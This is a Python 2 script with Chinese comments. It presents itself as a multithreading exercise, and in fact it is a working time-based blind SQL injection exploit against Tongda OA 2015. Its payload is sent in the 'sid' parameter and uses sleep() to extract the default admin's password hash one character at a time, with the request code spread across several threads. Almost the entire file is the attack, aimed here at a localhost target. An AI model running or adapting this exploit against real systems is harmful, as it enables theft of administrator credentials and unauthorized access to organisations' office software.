#!/usr/bin/env python

import time
import Queue
import requests
import threading

"""

多线程 猜测口令

以通达0A 2015 （更新日期为20160722）版本SQL注入漏洞为测试对象，爆破默认管理员admin的密码hash（unix 格式）

使用到的多线程共享数据技术：

Queue

多线程间写数据，需要加lock

"""


class GuessPassword(object):
    def __init__(self, passwd_length, threads=3, timeout=6):
        self.stop = False
        self.result = {}
        self.threads = threads
        self.timeout = timeout
        self.queue = Queue.Queue()
        self.lock = threading.RLock()
        self.cookie = {'_SERVER': ''}
        self.passwd_length = passwd_length
        self.url = "http://localhost/general/document/index.php/send/approve/finish"
        self.payload = "1) and char(@`'`)  union select if(ord(mid(PASSWORD,{position},1))={guess_char},sleep(8),1),1 from user WHERE BYNAME = 0x61646d696e #and char(@`'`)"

        for _ in range(1, self.passwd_length):
            self.queue.put(_)

    def exploit(self):
        while self.queue.qsize() > 0 and not self.stop:
            passwd_position = self.queue.get()
            for _guess_char in range(33, 128):
                payload = self.payload.format(position=passwd_position, guess_char=_guess_char)
                exp_data = {'sid': payload}
                try:
                    res = requests.post(self.url, data=exp_data, cookies=self.cookie, timeout=self.timeout)
                except requests.ReadTimeout:
                    self.lock.acquire()
                    self.result[passwd_position] = chr(_guess_char)
                    print "Data %dth: %s" % (passwd_position, self.result[passwd_position])
                    self.lock.release()
                    break

    def run(self):

        for _ in range(self.threads):
            _worker = threading.Thread(target=self.exploit, name=_)
            _worker.setDaemon(True)
            _worker.start()

        try:
            while threading.active_count() > 1:  # threading.active_count() 获取当前活动线程数，包括当前主进程
                time.sleep(1)

        except KeyboardInterrupt:
            print "start to stop all subprocess ......"
            self.stop = True
        else:
            print "finish"


if __name__ == '__main__':
    GuessPassword(14, 6).run()
